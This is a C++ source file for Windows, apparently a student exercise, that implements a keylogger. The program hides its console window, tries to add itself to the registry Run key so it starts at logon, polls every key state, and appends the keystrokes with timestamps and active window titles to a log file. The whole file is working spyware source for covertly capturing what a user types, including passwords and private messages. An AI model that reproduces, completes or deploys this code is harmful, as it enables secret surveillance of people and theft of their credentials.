#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <ctime>

std::ofstream outputFile("D:\\VCS\\System Programming\\system-programming\\Windows\\Keylogger\\log.txt", std::ios::app);

void keepPersistent() {
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, 
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                 0, 
                 KEY_SET_VALUE, 
                 &hKey);
    RegSetValueEx(hKey,
                  "Keylogger",
                  0,
                  REG_SZ,
                  (BYTE*) "D:\\VCS\\System Programming\\system-programming\\Windows\\Keylogger\\main.exe",
                  sizeof("D:\\VCS\\System Programming\\system-programming\\Windows\\Keylogger\\main.exe"));

    RegCloseKey(hKey);
}

std::string getCurrentTime() {    
    time_t now = time(0);
    char* dt = ctime(&now);

    return std::string(dt);
}

std::string getActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    char wnd_title[256];

    GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));

    return std::string(wnd_title);
}

int saveToFile(char c) {
    // Special keys
    switch (c) {
        case VK_SHIFT:
            outputFile <<  "[Shift]";
            break;
        case VK_BACK:
            outputFile <<  "[Backspace]";
            break;
         case VK_LBUTTON: 
            outputFile <<  "[Left Click]";
            break;
        case VK_RBUTTON: 
            outputFile <<  "[Right Click]";
            break;
        case VK_RETURN: 
            outputFile <<  "[Enter]";
            break;
        case VK_TAB: 
            outputFile <<  "[Tab]";
            break;
        case VK_ESCAPE: 
            outputFile <<  "[Esc]";
            break;
        case VK_CONTROL: 
            outputFile <<  "[Ctrl]";
            break;
        case VK_MENU: 
            outputFile <<  "[Alt]";
            break;
        case VK_CAPITAL: 
            outputFile <<  "[Caps Lock]";
            break;
        case VK_SPACE: 
            outputFile <<  "_";
            break;
        case VK_UP: 
            outputFile <<  "[Up Arrow]";
            break;
        case VK_DOWN: 
            outputFile <<  "[Down Arrow]";
            break;
        case VK_LEFT:
            outputFile <<  "[Left Arrow]";
            break;
        case VK_RIGHT:
            outputFile <<  "[Right Arrow]";
            break;        
        case VK_PRIOR:
            outputFile <<  "[Page Up]";
            break;
        case VK_NEXT:
            outputFile <<  "[Page Down]";
            break;
        case VK_OEM_PERIOD:
            outputFile <<  ".";
            break;
        case VK_DECIMAL:
            outputFile <<  ".";
            break;
        case VK_OEM_COMMA:
            outputFile <<  ",";
            break;        
        case VK_OEM_PLUS:
            outputFile <<  "+";
            break;
        case VK_ADD:
            outputFile <<  "+";
            break;
        case VK_OEM_MINUS:
            outputFile <<  "-";
            break;
        case VK_SUBTRACT:
            outputFile <<  "-";
            break;
        default:
            outputFile << c;
            break;
    }

    return 0;
}

int main() {
    std::string xor_key = "key";

    // ShowWindow(GetConsoleWindow(), SW_HIDE);
    FreeConsole();
    keepPersistent();   // this doesn't work atm :<

    std::string previousWindowTitle = "", currentWindowTitle = "", currentTime;

    while (true) {
        Sleep(100);
        currentWindowTitle = getActiveWindowTitle();

        std::cout << currentWindowTitle << std::endl;

        if (previousWindowTitle == currentWindowTitle) {
            currentTime = getCurrentTime();

            // Append to last line of file :v
            outputFile.seekp(0, std::ios::end);
            for (int i = 8; i <= 190; i++)
                if (GetAsyncKeyState(i) == -32767)
                    saveToFile(i);
        } else {
            previousWindowTitle = currentWindowTitle;
            outputFile << "\n[" << currentTime.substr(0, currentTime.size() - 1) << "] [" << currentWindowTitle << "] ";

            for (int i = 8; i <= 190; i++)
                if (GetAsyncKeyState(i) == -32767)
                    saveToFile(i);
        }
    }

    return 0;
}